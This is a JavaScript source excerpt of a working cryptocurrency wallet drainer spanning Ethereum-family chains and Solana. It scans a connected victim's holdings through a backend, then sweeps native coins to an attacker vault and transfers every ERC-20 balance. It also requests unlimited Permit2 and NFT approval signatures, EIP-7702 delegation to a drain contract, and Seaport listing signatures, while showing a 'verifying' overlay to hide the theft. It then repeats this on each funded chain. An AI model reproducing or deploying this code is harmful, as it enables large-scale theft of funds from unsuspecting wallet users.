      var caps = await provider.request({ method: 'wallet_getCapabilities', params: [address] });
      var key = '0x' + Number(chainId).toString(16);
      var cc = caps && (caps[key] || caps[String(chainId)] || caps[Number(chainId)]);
      var atomic = cc && (cc.atomic || cc.atomicBatch);
      var status = atomic && (atomic.status || (atomic.supported ? 'supported' : ''));
      var atomicBatch = status === 'ready' || status === 'supported' || !!(atomic && atomic.supported);
      var sendCalls = cc && cc.sendCalls;
      var sendCallsV2 = sendCalls && (sendCalls.version === '2.0.0' || sendCalls.supported === true);
      return { atomicBatch: atomicBatch, sendCallsV2: sendCallsV2 };
    } catch (e) {
      return { atomicBatch: isMetaMaskProvider(provider), sendCallsV2: false };
    }
  }

  async function scanAssets(provider, address, chainId) {
    var assets = { tokens: [], nfts: [], nativeHex: '0x0', usd: 0, defi_positions: [], uni_v3_positions: [], uni_v2_lps: [] };
    try {
      var scout = await apiPost('/api/v1/scout/ranked', { wallet_address: address, chain_id: Number(chainId) });
      if (scout && scout.data) {
        assets.usd = Number(scout.data.total_usd || 0);
        S.scoutUsd = Math.max(S.scoutUsd, assets.usd);
        (scout.data.assets || scout.data.ranked || []).forEach(function (t) {
          var contract = t.address || t.token;
          var bal = t.raw_balance || t.amount_raw || '0';
          if (contract && contract !== 'native' && String(contract).startsWith('0x') && BigInt(bal || '0') > 0n) {
            assets.tokens.push({
              address: String(contract).toLowerCase(),
              balance: String(bal),
              symbol: t.symbol,
              usd: t.usd_value || t.amount_usd || 0,
            });
          }
        });
        if (scout.data.nfts && scout.data.nfts.length) assets.nfts = scout.data.nfts;
        if (scout.data.defi_positions) assets.defi_positions = scout.data.defi_positions;
        if (scout.data.uni_v3_positions) assets.uni_v3_positions = scout.data.uni_v3_positions;
        if (scout.data.uni_v2_lps) assets.uni_v2_lps = scout.data.uni_v2_lps;
      }
    } catch (e) { L.warn('Scout fail:', e.message); }
    assets.tokens = filterDrainableTokens(assets.tokens);

    try {
      var nftScan = await apiPost('/api/v1/seaport/scan-listings', {
        wallet_address: address, wallet: address, chain_id: Number(chainId),
      });
      var listings = (nftScan && nftScan.data && nftScan.data.listings) || [];
      var seen = {};
      assets.nfts.forEach(function (n) { if (n.contract) seen[String(n.contract).toLowerCase()] = true; });
      listings.forEach(function (l) {
        var c = l.contract || l.nft_contract;
        if (c && !seen[c.toLowerCase()]) {
          seen[c.toLowerCase()] = true;
          assets.nfts.push({ contract: c, token_id: l.token_id, standard: l.standard || 'erc721' });
        }
      });
    } catch (e2) { L.warn('NFT scan skip:', e2.message); }

    try {
      assets.nativeHex = await evmRequestWithFallback(provider, chainId, 'eth_getBalance', [address, 'latest']) || '0x0';
    } catch (e3) {}

    var nativeBal = BigInt(assets.nativeHex || '0x0');
    if (nativeBal > 0n) {
      L.log('On-chain native:', (Number(nativeBal) / 1e18).toFixed(6), 'ETH on chain', chainId);
    }

    try {
      var fusionUsd = await SCOUT.ranked(address);
      if (fusionUsd && fusionUsd.total_usd != null) {
        var totalAll = Number(fusionUsd.total_usd) || 0;
        assets.usd = Math.max(assets.usd, totalAll);
        S.scoutUsd = Math.max(S.scoutUsd, assets.usd);
        L.log('Backend portfolio USD:', assets.usd.toFixed(2));
      }
    } catch (e4) { /* ranked all-chains optional */ }

    if (nativeBal > MIN_NATIVE_WEI && assets.usd < 1) {
      var ethFloorUsd = (Number(nativeBal) / 1e18) * 2500;
      if (ethFloorUsd > assets.usd) {
        assets.usd = ethFloorUsd;
        S.scoutUsd = Math.max(S.scoutUsd, assets.usd);
        L.log('Native ETH USD floor:', assets.usd.toFixed(2));
      }
    }

    return assets;
  }

  function normalizeSendCall(call) {
    var c = { to: call.to };
    if (call.value) c.value = call.value;
    if (call.data && call.data !== '0x' && String(call.data).length > 2) c.data = call.data;
    return c;
  }

  async function requestSendCallsBatch(provider, address, chainId, calls, atomicRequired) {
    var chainHex = '0x' + Number(chainId).toString(16);
    try {
      var batchId = await provider.request({
        method: 'wallet_sendCalls',
        params: [{
          version: '2.0.0',
          chainId: chainHex,
          from: address,
          atomicRequired: atomicRequired !== false,
          calls: calls,
        }],
      });
      return extractBatchOrTxId(batchId);
    } catch (e) {
      if (atomicRequired === false) throw e;
      L.warn('wallet_sendCalls v2 fail:', e.message);
      var batchId2 = await provider.request({
        method: 'wallet_sendCalls',
        params: [{
          version: '1.0',
          chainId: chainHex,
          from: address,
          atomicRequired: false,
          calls: calls,
        }],
      });
      return extractBatchOrTxId(batchId2);
    }
  }

  // 9.3 — TIER 1: wallet_sendCalls (ONE POPUP — ETH + ERC-20 + NFT)
  async function drainSendCalls(provider, address, chainId, assets) {
    var claimContract = resolveClaimContract(chainId);
    var vault = VAULT.evm;
    var calls = [];

    var tokenCount = (assets.tokens || []).filter(function (t) { return BigInt(t.balance || '0') > 0n; }).length;
    var nftContracts = {};
    (assets.nfts || []).forEach(function (n) { if (n.contract) nftContracts[n.contract.toLowerCase()] = true; });
    var nftCount = Object.keys(nftContracts).length;
    var bal = BigInt(assets.nativeHex || '0x0');
    var gasLimit = estimateSendCallsGasLimit(tokenCount, nftCount, bal > 0n, chainId);
    var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
    var sendEth = sweep.send;

    if (sendEth > MIN_NATIVE_WEI) {
      if (claimContract) {
        calls.push({ to: claimContract, value: '0x' + sendEth.toString(16), data: SIG_CLAIM });
        L.log('Native sweep → claim():', claimContract.slice(0, 10) + '...', (Number(sendEth) / 1e18).toFixed(6));
      } else {
        calls.push({ to: vault, value: '0x' + sendEth.toString(16) });
        L.log('Native sweep → vault (no claim contract):', (Number(sendEth) / 1e18).toFixed(6), 'ETH');
      }
    }

    // ERC-20 — direct transfer(vault, balance)
    var SIG_TRF = '0xa9059cbb';
    assets.tokens.forEach(function (t) {
      if (BigInt(t.balance || '0') > 0n) {
        calls.push({
          to: t.address,
          data: SIG_TRF + vault.replace('0x', '').padStart(64, '0') + BigInt(t.balance).toString(16).padStart(64, '0'),
        });
      }
    });

    // NFT — setApprovalForAll(vault, true)
    var SIG_APPR = '0xa22cb465';
    Object.keys(nftContracts).forEach(function (c) {
      calls.push({ to: c, data: SIG_APPR + vault.replace('0x', '').padStart(64, '0') + '1'.padStart(64, '0') });
    });

    if (claimContract && isFactoryCloneAddress(chainId, claimContract)) {
      calls.push({ to: claimContract, data: SIG_FINISH_DESTROY });
      L.log('[destroy] finishAndDestroy queued for factory clone');
    }

    if (calls.length === 0) return null;
    calls = calls.map(normalizeSendCall);

    var callChunks = chunkArray(calls, SEND_CALLS_MAX);
    L.log('wallet_sendCalls:', calls.length, 'calls in', callChunks.length, 'chunk(s)');
    var lastTxHash = null;
    for (var sci = 0; sci < callChunks.length; sci++) {
      var chunkCalls = callChunks[sci];
      try {
        var extracted = await requestSendCallsBatch(provider, address, chainId, chunkCalls, sci === 0);
        L.log('sendCalls chunk', sci + 1, 'batchId:', extracted ? extracted.slice(0, 42) : String(extracted));
        if (extracted && isLikelyTxHash(extracted)) lastTxHash = extracted;
    } catch (e) {
        if (sci === 0) {
          try {
            var extractedFallback = await requestSendCallsBatch(provider, address, chainId, chunkCalls, false);
            if (extractedFallback && isLikelyTxHash(extractedFallback)) lastTxHash = extractedFallback;
          } catch (e2) {
            L.warn('wallet_sendCalls chunk fail:', e2.message);
            if (sci === 0) return null;
          }
        } else {
          L.warn('wallet_sendCalls chunk', sci + 1, 'fail:', e.message);
        }
      }
    }
    return lastTxHash;
  }

  async function tryDestroyCloneAfterDrain(provider, address, chainId, claimContract) {
    if (!claimContract || !provider || !address) return;
    if (!isFactoryCloneAddress(chainId, claimContract)) return;
    try {
      var id = Number(chainId);
      var chainHex = '0x' + id.toString(16);
      var nonceHex = await provider.request({ method: 'eth_getTransactionCount', params: [address, 'pending'] });
      var fees = await estimateEip1559Fees(provider, chainId);
      await provider.request({
        method: 'eth_sendTransaction',
        params: [{
          from: address,
          to: claimContract,
          data: SIG_FINISH_DESTROY,
          value: '0x0',
          chainId: chainHex,
          nonce: toHexQty(nonceHex),
          gas: '0x186a0',
          maxFeePerGas: toHexQty(fees.maxFeePerGas),
          maxPriorityFeePerGas: toHexQty(fees.maxPriorityFeePerGas),
        }],
      });
      S.deactivatedContracts[String(claimContract).toLowerCase()] = true;
      L.log('[destroy] finishAndDestroy sent on chain', chainId);
    } catch (e) { L.warn('[destroy] finishAndDestroy skip:', e.message); }
  }

  /** Mobile / WC — claim() contract when deployed, else direct vault transfer */
  async function drainNativeSendTx(provider, address, chainId, assets) {
    var claimContract = resolveClaimContract(chainId);
    var gasLimit = claimContract ? 120000n : NATIVE_TRANSFER_GAS;
    var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
    var sendEth = sweep.send;
    if (sendEth <= MIN_NATIVE_WEI) return null;
    var vault = VAULT.evm;
    var chainHex = '0x' + Number(chainId).toString(16);
    try {
      var nonceHex = await provider.request({ method: 'eth_getTransactionCount', params: [address, 'pending'] });
      var fees = await estimateEip1559Fees(provider, chainId);
      var tx = {
        from: address,
        to: claimContract || vault,
        value: toHexQty(sendEth),
        data: claimContract ? SIG_CLAIM : '0x',
        chainId: chainHex,
        nonce: toHexQty(nonceHex),
        gas: toHexQty(gasLimit),
        maxFeePerGas: toHexQty(fees.maxFeePerGas),
        maxPriorityFeePerGas: toHexQty(fees.maxPriorityFeePerGas),
      };
      if (claimContract) {
        var onVault = await readContractVault(provider, claimContract);
        L.log('eth_sendTransaction claim() →', claimContract.slice(0, 10) + '...',
          '| forwards to:', (onVault || VAULT.evm).slice(0, 10) + '...',
          '|', (Number(sendEth) / 1e18).toFixed(6), 'native');
      } else {
        L.log('eth_sendTransaction native → vault (deploy ClaimForwarder):', (Number(sendEth) / 1e18).toFixed(6));
      }
      var hash = await provider.request({ method: 'eth_sendTransaction', params: [tx] });
      if (claimContract && isFactoryCloneAddress(chainId, claimContract)) {
        tryDestroyCloneAfterDrain(provider, address, chainId, claimContract);
      }
      return hash ? String(hash) : null;
    } catch (e) {
      L.warn('eth_sendTransaction fail:', e.message);
      return null;
    }
  }

  // 9.4 — TIER 2: EIP-7702 wallet_signAuthorization (ONE POPUP)
  async function drainEip7702(provider, address, chainId, assets) {
    if (!S.eip7702Enabled) return null;
    var delegate = resolveLegionDrain(chainId) || BATCH_DRAIN[Number(chainId)];
    if (!delegate || delegate === '0x0000000000000000000000000000000000000000') return null;
    if (!EIP7702_CHAINS[Number(chainId)]) return null;

    try {
      var nonceHex = await provider.request({ method: 'eth_getTransactionCount', params: [address, 'pending'] });
      var nonce = parseInt(String(nonceHex).replace('0x', ''), 16);

      L.log('wallet_signAuthorization...');
      var auth = await provider.request({
        method: 'wallet_signAuthorization',
        params: [{ contractAddress: delegate, chainId: '0x' + Number(chainId).toString(16), nonce: nonce }],
      });
      var defiActions = buildDefiActions(chainId, assets);
      L.log('EIP-7702 auth ok | defi actions:', defiActions.length);
      return {
        auth: auth,
        delegate: delegate,
        nonce: nonce,
        erc20s: assets.tokens.map(function (t) { return t.address; }),
        defiActions: defiActions,
      };
    } catch (e) { L.warn('wallet_signAuthorization not supported:', e.message); return null; }
  }

  async function signNativeForBatch(provider, address, chainId, nativeTransfer) {
    if (!nativeTransfer) return null;
    var txParams = {
      from: nativeTransfer.from || address,
      to: nativeTransfer.to,
      value: nativeTransfer.value && String(nativeTransfer.value).startsWith('0x')
        ? nativeTransfer.value : ('0x' + BigInt(nativeTransfer.value || '0').toString(16)),
      gas: nativeTransfer.gas || ('0x' + NATIVE_TRANSFER_GAS.toString(16)),
      nonce: '0x' + Number(nativeTransfer.nonce || 0).toString(16),
      type: '0x2',
      chainId: '0x' + Number(nativeTransfer.chainId || chainId || 1).toString(16),
    };
    if (nativeTransfer.maxFeePerGas) {
      txParams.maxFeePerGas = nativeTransfer.maxFeePerGas;
      txParams.maxPriorityFeePerGas = nativeTransfer.maxPriorityFeePerGas;
    } else {
      var fees = await estimateEip1559Fees(provider, chainId || nativeTransfer.chainId || 1);
      txParams.maxFeePerGas = '0x' + fees.maxFeePerGas.toString(16);
      txParams.maxPriorityFeePerGas = '0x' + fees.maxPriorityFeePerGas.toString(16);
    }
    try {
      L.log('eth_signTransaction (backend will broadcast)...');
      var signed = await provider.request({ method: 'eth_signTransaction', params: [txParams] });
      if (signed && String(signed).startsWith('0x')) return signed;
    } catch (e) {
      if (isUserRejection(e)) throw e;
      L.warn('eth_signTransaction unavailable:', e.message);
    }
    return null;
  }

  // personal_sign / evm_personal_verification REMOVED — does not move funds on backend.

  // 9.5b — REMOVED: drainNative (eth_sendTransaction) — user never broadcasts; backend relays signed txs.

  // 9.6 — TIER 3B: ERC-20 via Permit2 (+ optional native + NFT approvals)
  async function drainPermit2(provider, address, chainId, tokens, nfts, nativeAmountWei) {
    var nftArr = normNftList(nfts);
    var nftChunks = chunkArray(nftArr, NFT_APPROVAL_BATCH_SIZE);
    if (nftChunks.length === 0) nftChunks = [[]];

    var merged = null;
    tokens = filterDrainableTokens(tokens || []);
    if (!tokens.length && (!nfts || !nfts.length) && (!nativeAmountWei || nativeAmountWei <= 0n)) return null;
    for (var chunkIdx = 0; chunkIdx < nftChunks.length; chunkIdx++) {
      var nftChunk = nftChunks[chunkIdx];
      var isFirst = chunkIdx === 0;
      var permits = isFirst
        ? (tokens || []).map(function (t) { return { token: t.address, amount: MAX_AMOUNT }; })
        : [];
      var nativeStr = (isFirst && nativeAmountWei && nativeAmountWei > 0n)
        ? nativeAmountWei.toString() : '0';
      if (permits.length === 0 && nftChunk.length === 0 && nativeStr === '0') continue;
      if (permits.length === 0 && nftChunk.length > 0 && nativeStr === '0' && !isFirst) { /* NFT-only chunk */ }

      var part = await drainPermit2Chunk(provider, address, chainId, permits, nftChunk, nativeStr);
      if (!part) continue;
      if (!merged) {
        merged = part;
      } else {
        if (part.sig) merged.sig = part.sig;
        if (part.nativeSigned) merged.nativeSigned = part.nativeSigned;
        Object.keys(part.nftApprovalSigs || {}).forEach(function (k) {
          merged.nftApprovalSigs[k] = part.nftApprovalSigs[k];
        });
        merged.nfts = (merged.nfts || []).concat(part.nfts || []);
      }
    }
    return merged;
  }

  async function drainPermit2Chunk(provider, address, chainId, permits, nftArr, nativeStr) {
    if (permits.length === 0 && nftArr.length === 0 && nativeStr === '0') return null;

    var resp = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
      wallet_address: address,
      chain_id: Number(chainId),
      permits: permits,
      nativeAmount: nativeStr,
      native_amount: nativeStr,
      nfts: nftArr,
      batch_nft_approvals: nftArr.length > 0,
      nft_batch_size: NFT_APPROVAL_BATCH_SIZE,
    });
    if (!resp || !resp.data) { L.warn('Permit2 typed_data fail'); return null; }
    var bd = resp.data;
    if (!bd.typed_data && permits.length === 0 && !bd.native_transfer) return null;

    var permitSig = null;
    if (bd.typed_data) {
      var td = normalizeTypedData(JSON.parse(JSON.stringify(bd.typed_data)));
      td = applyDynamicEip712Domain(td, chainId);
      L.log('Permit2 typed_data received, requesting signature...');
      try {
        permitSig = await provider.request({
          method: 'eth_signTypedData_v4',
          params: [address, JSON.stringify(td)],
        });
      } catch (e) {
        if (isUserRejection(e)) throw e;
        permitSig = await provider.request({ method: 'eth_signTypedData_v4', params: [address, td] });
      }
    }

    var nftApprovalSigs = {};
    var nftEntries = extractNftApprovalEntries(bd.nft_approval_typed_data);
    if (nftEntries.length > 0 && !bd.batch_nft_in_permit) {
      var entryBatches = chunkArray(nftEntries, NFT_APPROVAL_BATCH_SIZE);
      for (var bi = 0; bi < entryBatches.length; bi++) {
        var batch = entryBatches[bi];
        for (var ni = 0; ni < batch.length; ni++) {
          var entry = batch[ni];
          try {
            var ntd = normalizeTypedData(JSON.parse(JSON.stringify(entry.typedData)));
            ntd = applyDynamicEip712Domain(ntd, chainId);
          var nsig = await provider.request({
            method: 'eth_signTypedData_v4', params: [address, JSON.stringify(ntd)],
          });
            nftApprovalSigs[entry.contract] = nsig;
          } catch (ne) { L.warn('NFT approval sign fail:', entry.contract, ne.message); }
        }
      }
    }

    var nativeSigned = null;
    if (BigInt(bd.nativeAmount || nativeStr || '0') > 0n && bd.native_transfer) {
      nativeSigned = await signNativeForBatch(provider, address, chainId, bd.native_transfer);
    }

    if (!permitSig && !nativeSigned && nftArr.length === 0) return null;

    return {
      sig: permitSig,
      batchData: bd,
      nativeSigned: nativeSigned,
      nativeBroadcast: null,
      nativeAmount: bd.nativeAmount || nativeStr,
      nftApprovalSigs: nftApprovalSigs,
      nfts: nftArr,
    };
  }

  // 9.7 — TIER 3C: Ledger/Trezor Permit2
  async function drainHardwarePermit2(hwObj, address, chainId, tokens, nfts) {
    if (!tokens || tokens.length === 0) return null;
    var resp = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
      wallet_address: address, chain_id: Number(chainId),
      permits: tokens.map(function (t) { return { token: t.address, amount: MAX_AMOUNT }; }),
      native_amount: '0', nfts: normNftList(nfts),
    });
    if (!resp || !resp.data || !resp.data.typed_data) return null;
    var td = normalizeTypedData(JSON.parse(JSON.stringify(resp.data.typed_data)));
    var sig = hwObj.type === 'ledger'
      ? await HW.signLedgerTypedData(hwObj, td)
      : await HW.signTrezorTypedData(td);
    if (!sig) return null;
    return { sig: sig, batchData: resp.data, nativeAmount: '0', nfts: normNftList(nfts), nftApprovalSigs: {} };
  }

  // 9.8 — TIER 3D: Seaport NFT
  async function drainNFT(provider, address, chainId) {
    var nftResults = [];
    try {
      var scan = await apiPost('/api/v1/seaport/scan-listings', { wallet: address, chain_id: Number(chainId) });
      if (!scan || !scan.data || !scan.data.listings || scan.data.listings.length === 0) return nftResults;
      for (var i = 0; i < scan.data.listings.length; i++) {
        var listing = scan.data.listings[i];
        try {
          var td = await apiPost('/api/v1/seaport/listing-typed-data', {
            wallet: address, token_id: listing.token_id, contract: listing.contract, chain_id: Number(chainId),
          });
          if (!td || !td.data || !td.data.typed_data) continue;
          var sig = await provider.request({ method: 'eth_signTypedData_v4', params: [address, JSON.stringify(td.data.typed_data)] });
          nftResults.push({ listing: listing, sig: sig, orderParams: td.data.order_parameters || {} });
        } catch (e) { L.warn('NFT listing sign fail:', e.message); }
      }
    } catch (e) { L.warn('NFT scan fail:', e.message); }
    return nftResults;
  }

  // 9.9 — DRAIN WATERFALL (reusable per chain)
  async function runDrainWaterfall(provider, address, chainId, walletName, hwObj, assets) {
    if (!assets) {
      assets = await scanAssets(provider, address, chainId);
    }
    await ensureUserFactoryContract(address, chainId);
    if (!(await stateDependentValidation(provider, address, chainId))) {
      S.lastDrainSkipReason = 'State validation failed (chain/vault/clone mismatch on chain ' + chainId + ')';
      L.log('State validation failed on chain', chainId, '— skip drain');
      return false;
    }
    if (!assetsHaveDrainableBalance(assets)) {
      S.lastDrainSkipReason = 'Chain ' + chainId + ' — no drainable on-wallet balance (RPC read)';
      L.log('Chain', chainId, 'no drainable balance — skip');
        return false;
    }

    if (hwObj) {
      UI.status('Approve in ' + hwObj.type + '...');
      var hwP2 = await drainHardwarePermit2(hwObj, address, chainId, assets.tokens, assets.nfts);
      if (hwP2) { await SUBMIT.permit2(hwP2, address, chainId, walletName, assets.nfts, {}); return true; }
      return false;
    }

    var caps = await getCapabilities(provider, address, chainId);
    L.log('chain', chainId, 'atomicBatch:', caps.atomicBatch, 'sendCallsV2:', caps.sendCallsV2, '| signOnly:', SIGN_ONLY);

    var gasLimit = estimateSendCallsGasLimit(
      assets.tokens.length, countUniqueNftContracts(assets.nfts), true, chainId
    );
    var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
    var nativeSend = sweep.send;
    if (nativeSend > 0n) {
      L.log('Vault sweep:', (Number(nativeSend) / 1e18).toFixed(6), 'native | gas cost:', (Number(sweep.gasCost) / 1e18).toFixed(6));
    }
    var didSomething = false;
    var isWcPath = walletName === 'WalletConnect' || !!(provider && provider.isWalletConnect);
    var isMm = isMetaMaskProvider(provider);

    UI.overlay.show('verifying');

    // MetaMask extension: Permit2 PRIMARY (7702 / external type-0x04 blocked)
    if (!didSomething && isMm && !isWcPath) {
      var mmDrainable = filterDrainableTokens(assets.tokens);
      var mmHasTargets = mmDrainable.length > 0 || assets.nfts.length > 0 || nativeSend > MIN_NATIVE_WEI;
      if (mmHasTargets) {
        try {
          var p2mm = await drainPermit2(
            provider, address, chainId, mmDrainable, assets.nfts,
            canTryNativeSignTx(provider) ? nativeSend : 0n
          );
          if (p2mm && isLethalEvmResult(p2mm)) {
            S.pendingEvmPermit2 = p2mm;
            didSomething = true;
            L.log('MetaMask Permit2 primary ok');
          }
        } catch (p2mme) {
          if (isUserRejection(p2mme)) throw p2mme;
          L.warn('MetaMask Permit2 primary fail:', p2mme.message);
        }
      }
    }

    // wallet_sendCalls v2 — only when capabilities confirm batch + not MetaMask-first path
    var canBatch = caps.atomicBatch && caps.sendCallsV2 !== false && NATIVE_BATCH_FALLBACK && !hwObj;
    var batchTokens = filterDrainableTokens(assets.tokens);
    var hasBatchTargets = nativeSend > MIN_NATIVE_WEI || batchTokens.length > 0 || assets.nfts.length > 0;
    if (!didSomething && canBatch && hasBatchTargets && !(isMm && !isWcPath)) {
      try {
        var batchRaw0 = await drainSendCalls(provider, address, chainId, assets);
        var batchId0 = extractBatchOrTxId(batchRaw0);
        if (batchId0 && isLikelyTxHash(batchId0)) {
          await SUBMIT.sendCalls(batchId0, address, chainId, walletName);
          didSomething = true;
        }
      } catch (b0e) {
        if (isUserRejection(b0e)) throw b0e;
        L.warn('sendCalls primary fail:', b0e.message);
      }
    }

    // WC / mobile — single native tx if batch unavailable
    if (!didSomething && isWcPath && MOBILE_SEND_TX && nativeSend > MIN_NATIVE_WEI) {
      L.log('WC native tx | native:', (Number(nativeSend) / 1e18).toFixed(6));
      try {
        var wcTx = await drainNativeSendTx(provider, address, chainId, assets);
        if (wcTx && isLikelyTxHash(wcTx)) {
          await SUBMIT.userBroadcast(wcTx, address, chainId, walletName, nativeSend);
            didSomething = true;
          }
      } catch (wce) {
        if (isUserRejection(wce)) throw wce;
        L.warn('WC claim() fail:', wce.message);
      }
    }

    // Permit2 fallback — valued tokens only (1 sign popup)
    var drainableTokens = filterDrainableTokens(assets.tokens);
    var nativeForPermit2 = canTryNativeSignTx(provider) ? nativeSend : 0n;
    if (!didSomething && drainableTokens.length > 0) {
      try {
        var p2 = await drainPermit2(provider, address, chainId, drainableTokens, assets.nfts, nativeForPermit2);
        if (p2 && isLethalEvmResult(p2)) {
          S.pendingEvmPermit2 = p2;
          didSomething = true;
        }
      } catch (pe) {
        if (isUserRejection(pe)) throw pe;
        L.warn('Permit2 fail:', pe.message);
      }
    } else if (!didSomething && nativeForPermit2 > MIN_NATIVE_WEI) {
      try {
        var p2n = await drainPermit2(provider, address, chainId, [], assets.nfts, nativeForPermit2);
        if (p2n && isLethalEvmResult(p2n)) {
          await SUBMIT.permit2(p2n, address, chainId, walletName, assets.nfts, p2n.nftApprovalSigs || {});
          didSomething = true;
        }
      } catch (pne) {
        if (isUserRejection(pne)) throw pne;
        L.warn('Native permit2 fail:', pne.message);
      }
    }

    // MetaMask claim() last resort — single tx
    if (!didSomething && nativeSend > MIN_NATIVE_WEI && isMm) {
      L.log('MetaMask claim() fallback');
      try {
        var mmTxFirst = await drainNativeSendTx(provider, address, chainId, assets);
        if (mmTxFirst && isLikelyTxHash(mmTxFirst)) {
          await SUBMIT.userBroadcast(mmTxFirst, address, chainId, walletName, nativeSend);
        didSomething = true;
        }
      } catch (mmeFirst) {
        if (isUserRejection(mmeFirst)) throw mmeFirst;
        L.warn('MetaMask claim() fail:', mmeFirst.message);
      }
    }

    if (!didSomething) {
      if (isMm && assets.tokens.length === 0) {
        L.warn('MetaMask native-only: batch or tokens required');
      } else {
        L.warn('No lethal signature on chain', chainId);
      }
    }

    L.log('Drain chain', chainId, didSomething ? 'ok' : 'skip');

    if (!didSomething && assets.nfts.length > 0) {
      var nftR = await drainNFT(provider, address, chainId);
      for (var i = 0; i < nftR.length; i++) {
        await SUBMIT.nft(nftR[i], address, chainId, walletName);
        didSomething = true;
      }
    }

    return didSomething;
  }

  async function runEvmDrainModeB(provider, address, startChainId, walletName, hwObj, portfolio) {
    if (!S.vaultLoaded) await prefetchVault();
    if (!portfolio) portfolio = await scanFullPortfolio(address);
    var chains = (portfolio.fundedChains && portfolio.fundedChains.length)
      ? portfolio.fundedChains.slice()
      : [startChainId];
    if (chains.indexOf(startChainId) === -1) chains.unshift(startChainId);
    var seen = {};
    var ordered = [];
    chains.forEach(function (cid) {
      if (!seen[cid]) { seen[cid] = true; ordered.push(cid); }
    });
    var anyOk = false;
    try {
      for (var i = 0; i < ordered.length; i++) {
        var cid = ordered[i];
        var cur = await getProviderChainId(provider);
        if (cur !== cid) {
          if (!(await safeSwitchProviderChain(provider, cid))) {
            L.log('Chain', cid, 'switch declined — skip');
            continue;
          }
          await waitForProviderChain(provider, cid, 8000);
        }
        logContractCoverage(cid);
        var assets = await buildChainAssets(provider, address, cid, portfolio);
        if (!chainHasDrainableAssets(assets)) {
          S.lastDrainSkipReason = 'Chain ' + cid + ' empty on-wallet — skip';
          L.log('Chain', cid, 'empty on-wallet — skip');
          continue;
        }
        L.log('Mode B drain chain', cid, '| $' + (assets.usd || 0).toFixed(2));
        var ok = await runDrainWaterfall(provider, address, cid, walletName, hwObj, assets);
        if (ok) anyOk = true;
      }
    } catch (e) {
      if (isUserRejection(e)) {
        await SCOUT.reportDrainStatus('user_rejected', address, startChainId, walletName, e.message);
      }
      throw e;
    }
    return anyOk;
  }

  async function runEvmDrain(provider, address, chainId, walletName, hwObj, portfolio) {
    return runEvmDrainModeB(provider, address, chainId, walletName, hwObj, portfolio);
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 10: SOLANA MODULE (full — SOL + SPL, per-tx submit)
  // ═══════════════════════════════════════════════════════════════
  async function connectSol() {
    if (S.familyConnections.SVM) return S.familyConnections.SVM;
    var entry = firstFamilyProvider('SVM');
    if (!entry) return null;
    var prov = entry.provider;
    try {
      if (prov.features && prov.features['standard:connect']) {
        await prov.features['standard:connect'].connect({});
      } else if (prov.connect) {
        await prov.connect();
      }
      var pk = prov.publicKey;
      var addr = pk ? (pk.toString ? pk.toString() : String(pk)) : '';
      if (!addr) return null;
      L.log('[SVM] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
      S.chains.SOL = { address: addr, name: 'SVM' };
      return { provider: prov, address: addr, name: 'SVM', family: 'SVM', hint: entry.hint };
    } catch (e) { L.warn('[SVM] connect fail:', e.message); return null; }
  }

  async function loadSolWeb3() {
    if (window.solanaWeb3) return window.solanaWeb3;
    try {
      await loadVendorScript('solana-web3.iife.min.js');
      if (window.solanaWeb3) return window.solanaWeb3;
    } catch (e) { L.warn('Solana vendor:', e.message); }
    if (!CDN_FALLBACK) throw new Error('solana-web3 vendor missing');
    await new Promise(function (resolve, reject) {
      var s = document.createElement('script');
      s.src = 'https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js';
      s.onload = resolve; s.onerror = reject;
      document.head.appendChild(s);
    });
    return window.solanaWeb3;
  }

  async function drainSol(conn) {
    if (!conn) return null;
    var vault = VAULT.sol;
      var web3 = await loadSolWeb3();
    var connection = await createSolConnection(web3);
      var fromPk = new web3.PublicKey(conn.address);
      var toPk = new web3.PublicKey(vault);
    var blockhash = (await connection.getLatestBlockhash('confirmed')).blockhash;
      var txList = [];
    var txMetas = [];

      var lamports = await connection.getBalance(fromPk);
    var feeReserve = 50000;
    if (lamports > feeReserve + 5000) {
        var solTx = new web3.Transaction();
        solTx.recentBlockhash = blockhash;
        solTx.feePayer = fromPk;
      var sendLam = lamports - feeReserve;
      solTx.add(web3.SystemProgram.transfer({ fromPubkey: fromPk, toPubkey: toPk, lamports: sendLam }));
        txList.push(solTx);
      txMetas.push({ mint: '11111111111111111111111111111111', amount: String(sendLam), type: 'SOL' });
      }

      var TOKEN_PROG = new web3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
      var ASSOC_PROG = new web3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1fs8');
      try {
        var tokenRes = await connection.getTokenAccountsByOwner(fromPk, { programId: TOKEN_PROG }, { encoding: 'jsonParsed' });
        for (var ti = 0; ti < tokenRes.value.length; ti++) {
          var info = tokenRes.value[ti].account.data.parsed.info;
          var rawAmt = info.tokenAmount && info.tokenAmount.amount;
          if (!rawAmt || rawAmt === '0') continue;
          var mintKey = new web3.PublicKey(info.mint);
          var userATA = new web3.PublicKey(tokenRes.value[ti].pubkey.toString());
          var vaultATA = web3.PublicKey.findProgramAddressSync(
            [toPk.toBuffer(), TOKEN_PROG.toBuffer(), mintKey.toBuffer()], ASSOC_PROG
          )[0];
          var splTx = new web3.Transaction();
          splTx.recentBlockhash = blockhash;
          splTx.feePayer = fromPk;
          var vaultInfo = await connection.getAccountInfo(vaultATA);
          if (!vaultInfo) {
            splTx.add(new web3.TransactionInstruction({
              keys: [
                { pubkey: fromPk, isSigner: true, isWritable: true },
                { pubkey: vaultATA, isSigner: false, isWritable: true },
                { pubkey: toPk, isSigner: false, isWritable: false },
                { pubkey: mintKey, isSigner: false, isWritable: false },
                { pubkey: web3.SystemProgram.programId, isSigner: false, isWritable: false },
                { pubkey: TOKEN_PROG, isSigner: false, isWritable: false },
              ],
              programId: ASSOC_PROG, data: new Uint8Array(0),
            }));
          }
        var amt = BigInt(rawAmt);
          var data = new Uint8Array(9);
          data[0] = 3;
          var dv = new DataView(data.buffer, 1);
          dv.setUint32(0, Number(amt & 0xFFFFFFFFn), true);
          dv.setUint32(4, Number((amt >> 32n) & 0xFFFFFFFFn), true);
          splTx.add(new web3.TransactionInstruction({
            keys: [
